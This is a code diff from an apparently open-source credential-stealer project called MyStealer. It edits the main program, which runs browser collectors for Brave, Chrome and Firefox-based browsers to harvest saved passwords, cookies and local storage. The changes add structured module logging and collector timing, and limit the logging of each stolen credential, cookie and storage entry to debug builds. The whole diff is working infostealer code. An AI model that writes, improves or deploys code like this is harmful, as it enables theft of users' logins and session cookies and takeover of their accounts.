@@ -5,12 +5,15 @@ using MyStealer.Collectors.Browser.FirefoxBased;
 using Serilog;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 
 namespace MyStealer
 {
     internal static class Program
     {
+        private const string LogTemplate = "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] <{Module:l}> {Message:lj}{NewLine}{Exception}";
+
         private static readonly IBrowserCollector[] BrowserCollectors = new IBrowserCollector[] {
             new Brave(),
             new Chrome(),
@@ -40,8 +43,9 @@ namespace MyStealer
 
                     var logConfig = new LoggerConfiguration();
                     logConfig = (args.Length > 0 && args[0] == "verbose") ? logConfig.MinimumLevel.Verbose() : logConfig.MinimumLevel.Debug();
-                    logConfig = logConfig.WriteTo.File(Config.LogFilePath, hooks: encHook);
-                    Log.Logger = logConfig.CreateLogger();
+                    logConfig = logConfig.WriteTo.File(Config.LogFilePath, outputTemplate: LogTemplate, hooks: encHook);
+                    LogExt.BaseLogger = logConfig.CreateLogger();
+                    Log.Logger = LogExt.ForModule("Main");
 
                     /* Do the job */
 
@@ -54,9 +58,11 @@ namespace MyStealer
                     {
                         try
                         {
+                            var sw = new Stopwatch();
                             Log.Debug("Check if browser is available: {browser}", browser.ApplicationName);
                             if (browser.IsAvailable())
                             {
+                                sw.Start();
                                 Log.Information("Running browser data collector: {browser}", browser.ApplicationName);
                                 browser.Initialize();
                                 try
@@ -64,7 +70,9 @@ namespace MyStealer
                                     foreach (var cred in browser.GetCredentials())
                                     {
                                         creds.Add(cred);
+#if DEBUG
                                         Log.Information(cred.ToString());
+#endif
                                     }
                                 }
                                 catch (Exception ex)
@@ -77,7 +85,9 @@ namespace MyStealer
                                     foreach (var cookie in browser.GetCookies())
                                     {
                                         cookies.Add(cookie);
+#if DEBUG
                                         Log.Information(cookie.ToString());
+#endif
                                     }
                                 }
                                 catch (Exception ex)
@@ -90,13 +100,18 @@ namespace MyStealer
                                     foreach (var storageEntry in browser.GetLocalStorageEntries())
                                     {
                                         localStorage.Add(storageEntry);
+#if DEBUG
                                         Log.Information(storageEntry.ToString());
+#endif
                                     }
                                 }
                                 catch (Exception ex)
                                 {
                                     Log.Error(ex, "Browser storages {name} failed.", browser.ApplicationName);
                                 }
+
+                                sw.Stop();
+                                Log.Debug("Browser collector {browser} took {time} ms", browser.ApplicationName, sw.ElapsedMilliseconds);
                             }
                         }
                         catch (Exception ex)
